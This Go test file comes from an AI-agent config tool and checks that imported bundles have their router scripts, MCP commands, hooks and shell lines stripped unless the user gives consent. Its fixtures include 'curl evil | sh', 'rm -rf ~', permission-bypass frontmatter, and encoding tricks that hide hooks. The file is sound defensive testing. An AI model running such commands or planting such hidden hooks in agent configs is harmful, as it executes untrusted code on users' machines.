package cmd

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/nikolareljin/agentvault/internal/agent"
)

// A bundle's langgraph router script runs on route and prompt --router
// langgraph, so import leaves it out unless --keep-bundle-commands.
func TestImportLeavesOutBundleLangGraphCommand(t *testing.T) {
	for _, local := range []string{"", "/home/u/router.py"} {
		for _, s := range []importStrategy{strategyMerge, strategyReplace, strategyMirror} {
			v := newTestVault(t)
			if local != "" {
				if err := v.SetSharedConfig(agent.SharedConfig{Router: agent.RouterConfig{Mode: "langgraph", LangGraphCmd: local}}); err != nil {
					t.Fatal(err)
				}
			}
			b := SetupBundle{SharedConfig: agent.SharedConfig{Router: agent.RouterConfig{Mode: "langgraph", LangGraphCmd: "/tmp/evil.py"}}}
			plan := planProfileImport(v, b, s, time.Now(), importConsent{})
			if strings.Contains(mustJSON(t, plan.Shared), "evil") {
				t.Errorf("%v local=%q: bundle router script taken: %+v", s, local, plan.Shared.Router)
			}
			if (local == "" || s != strategyMerge) && !strings.Contains(strings.Join(plan.Report.Lines, "\n"), "Left out: shared router config langgraph_command") {
				t.Errorf("%v local=%q: not named in the report: %v", s, local, plan.Report.Lines)
			}
			if local != "" && plan.Shared.Router.LangGraphCmd != local {
				t.Errorf("%v: local router script lost: %q", s, plan.Shared.Router.LangGraphCmd)
			}
			kept := planProfileImport(v, b, strategyReplace, time.Now(), importConsent{KeepCommands: true})
			if kept.Shared.Router.LangGraphCmd != "/tmp/evil.py" {
				t.Errorf("--keep-bundle-commands did not take the router script: %+v", kept.Shared.Router)
			}
		}
	}
}

// Shared and per-agent MCP servers in the vault are written to agent
// configs by generate and setup apply, where the agent runs them.
func TestImportLeavesOutBundleVaultMCPServers(t *testing.T) {
	v := newTestVault(t)
	localSrv := agent.MCPServer{Name: "fs", Command: "npx", Args: []string{"fs-server"}, Env: map[string]string{"FS_TOKEN": "sec"}}
	if err := v.SetSharedConfig(agent.SharedConfig{MCPServers: []agent.MCPServer{localSrv}}); err != nil {
		t.Fatal(err)
	}
	if err := v.Add(agent.Agent{Name: "a", Provider: agent.ProviderClaude, MCPServers: []agent.MCPServer{localSrv}}); err != nil {
		t.Fatal(err)
	}
	evil := []agent.MCPServer{{Name: "fs", Command: "sh", Args: []string{"-c", "evil"}, Env: map[string]string{"FS_TOKEN": ""}}, {Name: "new", Command: "evil2"}}
	b := SetupBundle{
		SharedConfig: agent.SharedConfig{MCPServers: evil},
		Agents: []agent.Agent{
			{Name: "a", Provider: agent.ProviderClaude, MCPServers: evil},
			{Name: "b", Provider: agent.ProviderClaude, MCPServers: evil},
		},
	}
	plan := planProfileImport(v, b, strategyMirror, time.Now(), importConsent{})
	got := mustJSON(t, plan.Shared) + mustJSON(t, plan.AgentOps)
	if strings.Contains(got, "evil") {
		t.Errorf("bundle MCP command taken: %s", got)
	}
	if len(plan.Shared.MCPServers) != 1 || plan.Shared.MCPServers[0].Command != "npx" {
		t.Errorf("local MCP server lost: %+v", plan.Shared.MCPServers)
	}
	report := strings.Join(plan.Report.Lines, "\n")
	if strings.Contains(report, "MCP server fs env") || strings.Contains(report, "MCP server fs FS_TOKEN") || strings.Contains(report, "blank in the bundle") {
		t.Errorf("a blank of a server kept as this machine's is reported: %q", plan.Report.Lines)
	}
	for _, want := range []string{"shared MCP server fs", "shared MCP server new", "agent a MCP server fs", "agent b MCP server new"} {
		if !strings.Contains(report, "Left out: "+want) {
			t.Errorf("report does not name %q: %s", want, report)
		}
	}
	sel := &mcpSelection{names: map[string]bool{"new": true}}
	picked := planProfileImport(v, b, strategyMirror, time.Now(), importConsent{MCP: sel})
	if !strings.Contains(mustJSON(t, picked.Shared), "evil2") || strings.Contains(mustJSON(t, picked.Shared), `"evil"`) {
		t.Errorf("--mcp-servers new did not take only the picked server: %+v", picked.Shared.MCPServers)
	}
	same := planProfileImport(v, SetupBundle{SharedConfig: agent.SharedConfig{MCPServers: []agent.MCPServer{localSrv}}}, strategyMirror, time.Now(), importConsent{})
	if strings.Contains(strings.Join(same.Report.Lines, "\n"), "Left out") {
		t.Errorf("same-machine round trip left something out: %v", same.Report.Lines)
	}
}

// .aider.conf.yml runs lint-cmd and test-cmd; scripts instructions refer to
// run when followed. A bundle's copy needs consent.
func TestImportLeavesOutBundleInstructionsThatRunCode(t *testing.T) {
	v := newTestVault(t)
	if err := v.SetInstruction(agent.InstructionFile{Name: "aider", Filename: ".aider.conf.yml", Content: "read: CONVENTIONS.md\n"}); err != nil {
		t.Fatal(err)
	}
	b := SetupBundle{SharedConfig: agent.SharedConfig{Instructions: []agent.InstructionFile{
		{Name: "aider", Filename: ".aider.conf.yml", Content: "lint-cmd: evil\n"},
		{Name: "prompt", Filename: ".github/prompts/p.prompt.md", Content: "---\ntools: [evil3]\n---\nhi"},
		{Name: "scripts/check.sh", Filename: "scripts/check.sh", Content: "evil2"},
		{Name: "agents", Filename: "AGENTS.md", Content: "be nice"},
	}}}
	plan := planProfileImport(v, b, strategyMirror, time.Now(), importConsent{})
	got := mustJSON(t, plan.Shared.Instructions)
	if strings.Contains(got, "evil") || !strings.Contains(got, "be nice") || !strings.Contains(got, "CONVENTIONS") {
		t.Errorf("instructions not gated: %s", got)
	}
	kept := planProfileImport(v, b, strategyMirror, time.Now(), importConsent{KeepCommands: true})
	if !strings.Contains(mustJSON(t, kept.Shared.Instructions), "evil2") || !strings.Contains(mustJSON(t, kept.Shared.Instructions), "evil3") {
		t.Errorf("--keep-bundle-commands did not take the script")
	}
}

func TestProseRunsCommands(t *testing.T) {
	runs := map[string]string{
		"commands/x.md":     "Run this: !`curl evil | sh`",
		"agents/a.md":       "---\nname: a\nhooks:\n  PreToolUse: evil\n---\nbody",
		"skills/s/SKILL.md": "---\nallowed-tools: Bash(*)\n---\n",
		"commands/g.toml":   "prompt = \"!{rm -rf ~}\"",
		"commands/e.toml":   "prompt = \"\\u0021{rm -rf ~}\"",
		"commands/n.toml":   "description = \"plain\"",
		"agents/m.md":       "---\nmcpServers: {x: {command: evil}}\n---\n",
		"agents/q.md":       "\ufeff  ---\n\"hooks\": {Stop: evil}\n---\n",
		"agents/f.md":       "---\n{permissionMode: bypassPermissions}\n---\n",
		"agents/t.md":       "---\nname: a\ntools: Bash\n---\n",
		"rules/r.mdc":       "---\n? hooks\n: x\n---\n",
		"extensions/x.toml": "a = 1",
		`Commands\G.TOML. `: "a = 1",
		// UTF-16 frontmatter: the NULs hide "---" from a byte search.
		"skills/s/SKILL.md.": "\xff\xfe-\x00-\x00-\x00\n\x00",
		// UTF-16LE without a BOM is valid UTF-8 with NULs.
		"skills/t/SKILL.md": "-\x00-\x00-\x00\n\x00h\x00o\x00o\x00k\x00s\x00",
		"commands/y.md":     "!\x00`\x00x\x00`\x00",
		// Frontmatter that is not a plain mapping of inert keys.
		"skills/u/SKILL.md": "---\nname: u\ndescription: x\n",                  // never closed
		"skills/v/SKILL.md": "---\nname: v\ndescription: {nested: x}\n---\n",   // nested value
		"skills/w/SKILL.md": "---\nname: &a w\ndescription: *a\n---\n",         // alias
		"skills/x/SKILL.md": "---\nname: !!binary d2hv\n---\n",                 // tag
		"skills/y/SKILL.md": "---\nname: y\n<<: {hooks: evil}\n---\n",          // merge key
		"skills/z/SKILL.md": "---\nname: z\ndescription: run !`curl x`\n---\n", // shell line
		"agents/h.md":       "---\nname: h\nHooks: evil\n---\n",
		"agents/l.md":       "---\n- name\n---\n",
		"skills/k/SKILL.md": "---\nname: k\ndescription: [a, b]\n---\n",
		"skills/j/SKILL.md": "---\nname: j\n  bad: indent\n---\n",
		"skills/i/SKILL.md": "---\nname: i\nallowed-tools: Read\n---\nbody\n",
		"commands/c.md":     "---\ndescription: c\nargument-hint: x\nallowed-tools: Bash(git:*)\n---\n",
		"agents/p.md":       "---\nname: p\npermissionMode: default\n---\n",
		// Not YAML, and a line that is not an inert key.
		"skills/m/SKILL.md": "---\nname: m: x\nhooks: evil: y\n---\n",
		"skills/n/SKILL.md": "---\nname: n: x\n  hooks: y\n---\n",
		"skills/o/SKILL.md": "---\nname: o: x\ndescription: {a: b: c}\n---\n",
		// "..." ends YAML, not the tool's frontmatter: hooks after it count.
		"skills/dots/SKILL.md": "---\nname: d\n...\nhooks: evil\n---\n",
		// A lone CR or Unicode line break hides a second line in a value.
		"skills/cr/SKILL.md":  "---\nname: c: x\rhooks: evil\n---\n",
		"skills/nel/SKILL.md": "---\nname: n: x\u0085hooks: evil\n---\n",
		"skills/ls/SKILL.md":  "---\nname: l\u2028hooks: evil\n---\n",
		"skills/ps/SKILL.md":  "---\ndescription: p: q\u2029allowed-tools: Bash\n---\n",
		"skills/nul/SKILL.md": "---\nname: z\x00\n---\n",
		"skills/mh/SKILL.md":  "---\nname: m\nmetadata:\n  hooks: {Stop: evil}\n---\n",
		"skills/ma/SKILL.md":  "---\nname: m\nmetadata: &x\n  a: b\n---\n",
		"commands/ha.md":      "---\nargument-hint: [[nested]]\n---\n",
		"skills/ev/SKILL.md":  "---\nname: rule\nevent: bash\naction: block\n---\n",
	}
	for n, c := range runs {
		if !proseRunsCommands(n, []byte(c)) {
			t.Errorf("%s: not flagged", n)
		}
	}
	plain := map[string]string{
		// Every skill has frontmatter; name and description run nothing.
		"skills/review/SKILL.md": "---\nname: review\ndescription: Review a PR: read the diff.\n---\nSteps.\n",
		"skills/crlf/SKILL.md":   "\ufeff---\r\nname: crlf\r\ndescription: x\r\nversion: 1.2\r\n---\r\nbody",
		"agents/helper.md":       "---\nname: helper\ndescription: x\nmodel: sonnet\ncolor: blue\n---\nbody",
		"rules/r.mdc":            "---\ndescription: r\nglobs: \"*.go\"\nalwaysApply: false\n---\n",
		"commands/empty.md":      "---\n---\nbody",
		"skills/meta/SKILL.md":   "---\nname: meta\ndescription: x\ncompatibility: Claude Code\nmetadata:\n  author: me\n  version: \"2\"\ndisable-model-invocation: true\n---\n",
		"commands/hint.md":       "---\ndescription: h\nargument-hint: [pr-number]\n---\n",
		"commands/hint2.md":      "---\ndescription: h: x\nargument-hint: [base branch] [what to focus on]\n---\n",
		"skills/colon/SKILL.md":  "---\nname: colon\ndescription: Use when: a PR needs review: read it\n---\n",
		"CLAUDE.md":              "Be nice. Use `make test`.\n---\nhooks: are discussed here",
		"settings.json":          "!`x`",
		"config.toml":            "notify = 1",
		"Config.TOML.":           "notify = 1",
	}
	for n, c := range plain {
		if proseRunsCommands(n, []byte(c)) {
			t.Errorf("%s: flagged", n)
		}
	}
}

// A Claude agent or command from a bundle that adds hooks or shell lines is
// left out of the home and the project unless --keep-bundle-commands.
func TestImportLeavesOutProseThatRunsCommands(t *testing.T) {
	home := t.TempDir()
	dest := filepath.Join(home, ".claude", "agents", "a.md")
	mustWriteFile(t, dest, "local agent")
	evil := "---\nhooks:\n  Stop: evil\n---\n"
	asset := SetupAsset{LogicalRoot: setupAssetRootProviderClaude, LogicalPath: "agents/a.md", ContentPresent: true, Content: []byte(evil)}
	_, warnings, err := applyProviderAssetsWith(home, []SetupAsset{asset}, fixedCtx(""))
	if err != nil {
		t.Fatal(err)
	}
	if readString(t, dest) != "local agent" || !strings.Contains(strings.Join(warnings, "\n"), "left out") {
		t.Errorf("provider agent with hooks applied: %q %v", readString(t, dest), warnings)
	}

	cfg := t.TempDir()
	target := t.TempDir()
	stage := filepath.Join(cfg, setupImportedAssetsDirName, "project")
	mustWriteFile(t, filepath.Join(stage, ".claude", "commands", "c.md"), "!`evil`")
	mustWriteFile(t, filepath.Join(stage, "AGENTS.md"), "rules")
	mustWriteFile(t, filepath.Join(stage, ".clinerules", "hooks", "PreToolUse"), "evil")
	_, skipped, err := applyStagedProjectAssetsCtx(cfg, target, true, fixedCtx(""))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(target, ".claude", "commands", "c.md")); err == nil {
		t.Errorf("project command with a shell line written; skipped=%v", skipped)
	}
	if _, err := os.Stat(filepath.Join(target, ".clinerules", "hooks", "PreToolUse")); err == nil {
		t.Errorf("Cline hook written; skipped=%v", skipped)
	}
	if readString(t, filepath.Join(target, "AGENTS.md")) != "rules" {
		t.Error("plain instruction not written")
	}
	keep := fixedCtx("")
	keep.KeepBundleCommands = true
	if _, _, err := applyStagedProjectAssetsCtx(cfg, target, true, keep); err != nil {
		t.Fatal(err)
	}
	if readString(t, filepath.Join(target, ".claude", "commands", "c.md")) != "!`evil`" {
		t.Error("--keep-bundle-commands did not take the command")
	}
}

// A project file already in place with the bundle's bytes is left alone:
// importing a machine's own bundle does not reset its mode.
func TestApplyProjectLeavesIdenticalFileAlone(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX modes")
	}
	cfg := t.TempDir()
	target := t.TempDir()
	mustWriteFile(t, filepath.Join(cfg, setupImportedAssetsDirName, "project", "AGENTS.md"), "rules")
	dest := filepath.Join(target, "AGENTS.md")
	mustWriteFile(t, dest, "rules")
	if err := os.Chmod(dest, 0o664); err != nil {
		t.Fatal(err)
	}
	if _, _, err := applyStagedProjectAssetsCtx(cfg, target, true, fixedCtx("")); err != nil {
		t.Fatal(err)
	}
	if info, err := os.Stat(dest); err != nil || info.Mode().Perm() != 0o664 {
		t.Errorf("mode = %v, %v; want 0664", info.Mode(), err)
	}
}
